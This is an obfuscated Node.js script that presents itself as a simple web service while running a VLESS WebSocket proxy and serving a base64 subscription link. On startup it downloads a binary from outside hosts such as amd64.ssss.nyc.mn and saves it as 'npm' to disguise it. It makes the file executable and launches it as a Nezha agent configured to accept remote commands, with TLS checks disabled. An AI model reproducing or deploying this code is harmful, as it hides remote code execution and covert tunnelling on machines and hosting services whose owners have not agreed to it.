const _0x31ba35=_0x4d05;function _0x4d05(_0x6ab563,_0x3c93fa){_0x6ab563=_0x6ab563-0x1c0;const _0x31c449=_0x31c4();let _0x4d0568=_0x31c449[_0x6ab563];return _0x4d0568;}(function(_0x58b2f2,_0x32b4b1){const _0x460d21=_0x4d05,_0x4eaf7a=_0x58b2f2();while(!![]){try{const _0x2c71e3=-parseInt(_0x460d21(0x1f5))/0x1+-parseInt(_0x460d21(0x201))/0x2*(-parseInt(_0x460d21(0x212))/0x3)+-parseInt(_0x460d21(0x1e7))/0x4*(-parseInt(_0x460d21(0x200))/0x5)+parseInt(_0x460d21(0x1d3))/0x6+parseInt(_0x460d21(0x1f8))/0x7+parseInt(_0x460d21(0x1ec))/0x8*(parseInt(_0x460d21(0x20a))/0x9)+-parseInt(_0x460d21(0x214))/0xa*(parseInt(_0x460d21(0x20f))/0xb);if(_0x2c71e3===_0x32b4b1)break;else _0x4eaf7a['push'](_0x4eaf7a['shift']());}catch(_0x3453b0){_0x4eaf7a['push'](_0x4eaf7a['shift']());}}}(_0x31c4,0xcb295));const os=require('os'),http=require(_0x31ba35(0x1e4)),fs=require('fs'),axios=require(_0x31ba35(0x216)),net=require(_0x31ba35(0x1de)),path=require(_0x31ba35(0x1ef)),crypto=require(_0x31ba35(0x221)),{Buffer}=require(_0x31ba35(0x1e5)),{exec,execSync,spawn}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x31ba35(0x1cf)]['UUID']||'fe4c7abc-f8a7-4b34-abe8-9e2c62886097',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x31ba35(0x1cf)][_0x31ba35(0x220)]||'',NEZHA_KEY=process['env'][_0x31ba35(0x1f2)]||'',DOMAIN=process[_0x31ba35(0x1cf)][_0x31ba35(0x1fc)]||'',AUTO_ACCESS=process[_0x31ba35(0x1cf)]['AUTO_ACCESS']||!![],WSPATH=process[_0x31ba35(0x1cf)][_0x31ba35(0x1da)]||UUID[_0x31ba35(0x1d2)](0x0,0x8),SUB_PATH=process[_0x31ba35(0x1cf)][_0x31ba35(0x213)]||_0x31ba35(0x219),NAME=process[_0x31ba35(0x1cf)]['NAME']||_0x31ba35(0x21b),PORT=process[_0x31ba35(0x1cf)]['PORT']||0x1eb4;let ISP=_0x31ba35(0x218);const GetISP=async()=>{const _0x342e2a=_0x31ba35;try{const _0x3a5dc6=await axios[_0x342e2a(0x203)](_0x342e2a(0x1ca),{'timeout':0x1388}),_0x555a14=_0x3a5dc6['data'];ISP=(_0x555a14[_0x342e2a(0x1cd)]+'-'+_0x555a14['isp'])[_0x342e2a(0x1f4)](/ /g,'_'),console[_0x342e2a(0x204)](_0x342e2a(0x1c7)+ISP);}catch(_0x49097f){console[_0x342e2a(0x204)](_0x342e2a(0x205)),ISP='Unknown';}};GetISP();const generateClashConfig=(_0xc42f86,_0x33a4bb,_0x3172ef,_0x57169d,_0x4390ba)=>{const _0x236a5c=_0x31ba35;return'\x0aproxies:\x0a\x20\x20-\x20name:\x20'+_0xc42f86+_0x236a5c(0x1f6)+_0x33a4bb+'\x0a\x20\x20\x20\x20port:\x20443\x0a\x20\x20\x20\x20uuid:\x20'+_0x57169d+_0x236a5c(0x210)+_0x33a4bb+_0x236a5c(0x1c4)+_0x4390ba+_0x236a5c(0x1e3)+_0x33a4bb+_0x236a5c(0x21d)+_0xc42f86+_0x236a5c(0x1ea);},httpServer=http['createServer']((_0x4537d0,_0x4e3a90)=>{const _0x2000ba=_0x31ba35;if(_0x4537d0[_0x2000ba(0x1ee)]==='/')_0x4e3a90['writeHead'](0xc8,{'Content-Type':_0x2000ba(0x225)}),_0x4e3a90['end'](_0x2000ba(0x1c3));else{if(_0x4537d0[_0x2000ba(0x1ee)]==='/'+SUB_PATH){const _0xc445a8=NAME?NAME+'-'+ISP:ISP,_0x35b453=_0x2000ba(0x1ce)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0xc445a8;_0x4e3a90[_0x2000ba(0x224)](0xc8,{'Content-Type':_0x2000ba(0x225)}),_0x4e3a90[_0x2000ba(0x1eb)](Buffer[_0x2000ba(0x1d8)](_0x35b453)['toString'](_0x2000ba(0x1cb)));}else _0x4e3a90[_0x2000ba(0x224)](0x194,{'Content-Type':_0x2000ba(0x225)}),_0x4e3a90[_0x2000ba(0x1eb)](_0x2000ba(0x20b));}}),wss=new WebSocket[(_0x31ba35(0x1e8))]({'server':httpServer}),uuid=UUID[_0x31ba35(0x1f4)](/-/g,''),getDownloadUrl=()=>{const _0xacb3fd=_0x31ba35,_0x1a2f97=os['arch']();console['log'](_0xacb3fd(0x1d6)+_0x1a2f97);const _0x150f41='https://github.com/nezhahq/agent/releases/latest/download',_0x4fc4b3=_0xacb3fd(0x1c5);return _0x1a2f97===_0xacb3fd(0x1fe)||_0x1a2f97===_0xacb3fd(0x223)||_0x1a2f97===_0xacb3fd(0x1df)?NEZHA_PORT?_0x4fc4b3+_0xacb3fd(0x1f7):_0x4fc4b3+_0xacb3fd(0x1cc):NEZHA_PORT?_0xacb3fd(0x21a):_0xacb3fd(0x206);},downloadFile=async()=>{const _0x661d0=_0x31ba35;if(!NEZHA_SERVER){console[_0x661d0(0x204)](_0x661d0(0x1dd));return;}const _0x2d93a9=getDownloadUrl();console[_0x661d0(0x204)](_0x661d0(0x202)+_0x2d93a9);try{const _0x47815d=await axios({'method':_0x661d0(0x203),'url':_0x2d93a9,'responseType':_0x661d0(0x20d)}),_0x274b51=fs[_0x661d0(0x20c)]('npm');return _0x47815d[_0x661d0(0x207)][_0x661d0(0x209)](_0x274b51),new Promise((_0x354878,_0x467780)=>{const _0x49b079=_0x661d0;_0x274b51['on'](_0x49b079(0x20e),()=>{const _0x1559b4=_0x49b079;console['log'](_0x1559b4(0x1f3)),exec(_0x1559b4(0x21f),_0x7f3376=>{const _0x1a5a0a=_0x1559b4;_0x7f3376?(console[_0x1a5a0a(0x1e6)](_0x1a5a0a(0x1d0),_0x7f3376),_0x467780(_0x7f3376)):_0x354878();});}),_0x274b51['on']('error',_0x22a55c=>{const _0x43eca0=_0x49b079;console[_0x43eca0(0x1e6)]('[Error]\x20File\x20write\x20error:',_0x22a55c),_0x467780(_0x22a55c);});});}catch(_0x4466bc){console[_0x661d0(0x1e6)]('[Error]\x20Failed\x20to\x20download\x20agent:\x20'+_0x4466bc[_0x661d0(0x1d9)]);}},runnz=async()=>{const _0x45f735=_0x31ba35;try{const _0x4a57d7=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x45f735(0x1f9)});if(_0x4a57d7&&_0x4a57d7[_0x45f735(0x1d7)]()!==''){console[_0x45f735(0x204)]('[Info]\x20Nezha\x20agent\x20is\x20already\x20running.');return;}}catch(_0x3a1d43){}await downloadFile();if(!fs[_0x45f735(0x1fd)](_0x45f735(0x1d4))){console[_0x45f735(0x1e6)](_0x45f735(0x21c));return;}let _0x710dc8=[],_0x52b66b=['443',_0x45f735(0x1c6),'2096',_0x45f735(0x1db),_0x45f735(0x1fb),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){console[_0x45f735(0x204)](_0x45f735(0x1c0));const _0x1470d9=_0x52b66b[_0x45f735(0x1ed)](NEZHA_PORT)?'--tls':'';_0x710dc8=['-s',NEZHA_SERVER+':'+NEZHA_PORT,'-p',NEZHA_KEY];if(_0x1470d9)_0x710dc8[_0x45f735(0x211)](_0x45f735(0x208));_0x710dc8['push']('--disable-auto-update',_0x45f735(0x21e),'4',_0x45f735(0x1e0),'--skip-procs');}else{if(NEZHA_SERVER){console[_0x45f735(0x204)](_0x45f735(0x222));let _0x959b24=NEZHA_SERVER,_0x500998='8008',_0x3f62eb=![];if(NEZHA_SERVER[_0x45f735(0x1ed)](':')){const _0x206447=NEZHA_SERVER['split'](':');_0x959b24=_0x206447[0x0],_0x500998=_0x206447[0x1];}(_0x52b66b['includes'](_0x500998)||_0x500998===_0x45f735(0x1c2))&&(_0x3f62eb=!![]);const _0x5ad357=NEZHA_KEY||UUID,_0x3c60ec=_0x45f735(0x1e9)+_0x959b24+':'+_0x500998+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3f62eb+_0x45f735(0x217)+_0x5ad357+_0x45f735(0x1f1)+_0x5ad357+'\x20\x0a';fs['writeFileSync'](_0x45f735(0x1c1),_0x3c60ec),console[_0x45f735(0x204)](_0x45f735(0x1f0)),_0x710dc8=['-c',_0x45f735(0x1c1)];}else{console[_0x45f735(0x204)](_0x45f735(0x1c8));return;}}console['log'](_0x45f735(0x1dc)+_0x710dc8[_0x45f735(0x1d5)]('\x20'));const _0x33ece4=spawn('./npm',_0x710dc8,{'stdio':_0x45f735(0x1e2),'cwd':process[_0x45f735(0x1c9)]()});_0x33ece4['on'](_0x45f735(0x1e6),_0x24284e=>{console['error']('[Error]\x20Failed\x20to\x20start\x20subprocess:',_0x24284e);}),_0x33ece4['on'](_0x45f735(0x1e1),_0x40098f=>{const _0x4a5a98=_0x45f735;console['log'](_0x4a5a98(0x1d1)+_0x40098f);});};async function addAccessTask(){const _0x54adef=_0x31ba35;if(!AUTO_ACCESS||!DOMAIN)return;console[_0x54adef(0x204)](_0x54adef(0x215));}httpServer[_0x31ba35(0x1ff)](PORT,()=>{const _0x2acd99=_0x31ba35;console[_0x2acd99(0x204)](_0x2acd99(0x1fa)+PORT),setTimeout(()=>{runnz();},0x7d0),addAccessTask();});function _0x31c4(){const _0xfd3f7=['[Info]\x20Starting\x20Nezha\x20in\x20Standard\x20Mode\x20(Host:Port\x20+\x20Secret)','config.yaml','443','Service\x20is\x20running.\x20Debug\x20Mode\x20ON.','\x0a\x20\x20\x20\x20ws-opts:\x0a\x20\x20\x20\x20\x20\x20path:\x20/','https://s.nyc.mn','8443','[Info]\x20ISP\x20detected:\x20','[Warn]\x20NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','cwd','https://api.ip.sb/geoip','base64','/nezha-agent_linux_arm64.zip','country_code','vless://','env','[Error]\x20Failed\x20to\x20chmod\x20npm:','[Info]\x20Nezha\x20agent\x20process\x20exited\x20with\x20code\x20','slice','6503124arGEMJ','./npm','join','[Info]\x20System\x20Architecture:\x20','trim','from','message','WSPATH','2087','[Info]\x20Executing:\x20./npm\x20','[Warn]\x20NEZHA_SERVER\x20is\x20not\x20set.\x20Skip\x20downloading.','net','aarch64','--skip-conn','close','inherit','\x0a\x20\x20\x20\x20\x20\x20headers:\x0a\x20\x20\x20\x20\x20\x20\x20\x20Host:\x20','http','buffer','error','116oewnUH','Server','\x0adebug:\x20true\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0arules:\x0a\x20\x20-\x20MATCH,Select\x0a','end','9285784RgKGXT','includes','url','path','[Info]\x20config.yaml\x20created.','\x0aclient_secret:\x20','NEZHA_KEY','[Success]\x20Nezha\x20Agent\x20downloaded\x20successfully.','replace','1552778bARZJw','\x0a\x20\x20\x20\x20type:\x20vless\x0a\x20\x20\x20\x20server:\x20','/agent_linux_arm64','10889396qaprwO','utf-8','[Info]\x20Server\x20is\x20running\x20on\x20port\x20','2083','DOMAIN','existsSync','arm','listen','3485ZpfjmC','3374HrCakZ','[Info]\x20Downloading\x20Nezha\x20Agent\x20from:\x20','get','log','[Warn]\x20Failed\x20to\x20get\x20ISP\x20info,\x20using\x20default.','https://amd64.ssss.nyc.mn/v1','data','--tls','pipe','9kJxcid','Not\x20Found','createWriteStream','stream','finish','14566442mgEyzV','\x0a\x20\x20\x20\x20udp:\x20true\x0a\x20\x20\x20\x20tls:\x20true\x0a\x20\x20\x20\x20network:\x20ws\x0a\x20\x20\x20\x20servername:\x20','push','2157lnaYST','SUB_PATH','20MUVfVa','[Info]\x20Adding\x20keep-alive\x20task...','axios','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Unknown','sub','https://amd64.ssss.nyc.mn/agent','Hugging','[Error]\x20npm\x20binary\x20not\x20found.\x20Aborting\x20start.','\x0aproxy-groups:\x0a\x20\x20-\x20name:\x20Select\x0a\x20\x20\x20\x20type:\x20select\x0a\x20\x20\x20\x20proxies:\x0a\x20\x20\x20\x20\x20\x20-\x20','--report-delay','chmod\x20+x\x20npm','NEZHA_PORT','crypto','[Info]\x20Starting\x20Nezha\x20in\x20Config\x20Mode\x20(YAML)','arm64','writeHead','text/plain'];_0x31c4=function(){return _0xfd3f7;};return _0x31c4();}
